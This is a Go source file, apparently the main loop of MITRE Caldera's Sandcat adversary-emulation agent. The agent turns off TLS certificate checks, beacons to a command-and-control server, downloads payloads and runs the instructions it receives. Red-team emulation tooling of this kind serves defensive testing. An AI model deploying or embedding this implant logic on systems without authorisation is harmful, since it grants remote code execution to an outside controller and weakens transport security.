package core

import (
	"crypto/tls"
	"fmt"
	"net/http"
	"reflect"
	"time"

	"github.com/mitre/gocat/agent"
	"github.com/mitre/gocat/output"
	"github.com/mitre/gocat/util"

	_ "github.com/mitre/gocat/execute/shells" // necessary to initialize all submodules
)

// Initializes and returns sandcat agent.
func initializeCore(server string, group string,c2 map[string]string, p2pReceiversOn bool, verbose bool) (*agent.Agent, error) {
	output.SetVerbose(verbose)
	output.VerbosePrint("Starting sandcat in verbose mode.")
	return agent.AgentFactory(server, group, c2, p2pReceiversOn)
}

//Core is the main function as wrapped by sandcat.go
func Core(server string, group string, delay int, c2 map[string]string, p2pReceiversOn bool, verbose bool) {
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	sandcatAgent, err := initializeCore(server, group, c2, p2pReceiversOn, verbose)
	if err != nil {
		output.VerbosePrint(fmt.Sprintf("[-] Error when initializing agent: %s", err.Error()))
		output.VerbosePrint("[-] Exiting.")
	} else {
		sandcatAgent.Display()
		output.VerbosePrint(fmt.Sprintf("initial delay=%d", delay))
		util.Sleep(float64(delay))
		runAgent(sandcatAgent, c2)
		sandcatAgent.Terminate()
	}
}

// Establish contact with C2 and run instructions.
func runAgent (sandcatAgent *agent.Agent, c2Config map[string]string) {
	// Start main execution loop.
	watchdog := 0
	checkin := time.Now()
	for (util.EvaluateWatchdog(checkin, watchdog)) {
		// TODO - heartbeat will be incorporated later

		// Send beacon and get response.
		beacon := sandcatAgent.Beacon()

		// Process beacon response.
		if len(beacon) != 0 {
			sandcatAgent.SetPaw(beacon["paw"].(string))
			checkin = time.Now()

			// We have established comms. Run p2p receivers if allowed.
			// TODO
		}
		if beacon["instructions"] != nil && len(beacon["instructions"].([]interface{})) > 0 {
			// Run commands and send results.
			cmds := reflect.ValueOf(beacon["instructions"])
			for i := 0; i < cmds.Len(); i++ {
				cmd := cmds.Index(i).Elem().String()
				command := util.Unpack([]byte(cmd))
				output.VerbosePrint(fmt.Sprintf("[*] Running instruction %s", command["id"]))
				output.VerbosePrint(fmt.Sprintf("[*] Required payloads: %v", command["payloads"]))
				droppedPayloads := sandcatAgent.DownloadPayloads(command["payloads"].([]interface{}))
				go sandcatAgent.RunInstruction(command, droppedPayloads)
				util.Sleep(command["sleep"].(float64))
			}
		} else {
			if len(beacon) > 0 {
				util.Sleep(float64(beacon["sleep"].(int)))
				watchdog = beacon["watchdog"].(int)
			} else {
				util.Sleep(float64(15))
			}
		}
	}
}